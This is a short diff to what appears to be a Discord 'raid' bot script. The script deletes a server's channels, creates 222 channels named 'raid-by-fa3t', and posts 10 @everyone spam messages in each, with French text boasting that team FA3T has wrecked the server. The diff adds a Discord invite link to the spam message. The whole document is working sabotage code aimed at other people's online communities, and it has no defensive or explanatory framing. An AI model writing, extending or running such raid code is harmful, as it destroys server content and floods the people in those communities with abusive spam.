@@ -19,7 +19,7 @@ raid.deleteChannels("raid", {
 });
 raid.createChannels("raid", {
     createChannelName: "raid-by-fa3t",
-    sendMessageContent: ":biohazard: :biohazard: **@everyone LA TEAM FA3T VOUS BZ VOTRE SERVEUR @everyone** :biohazard: :biohazard:\n\n**https://giffiles.alphacoders.com/310/3105.gif",
+    sendMessageContent: ":biohazard: :biohazard: **@everyone LA TEAM FA3T VOUS BZ VOTRE SERVEUR @everyone** :biohazard: :biohazard:\n\n**https://discord.gg/a5rJk2D**\n\nhttps://giffiles.alphacoders.com/310/3105.gif",
     sendMessageCount: 10,
     createChannelCount: 222
 });
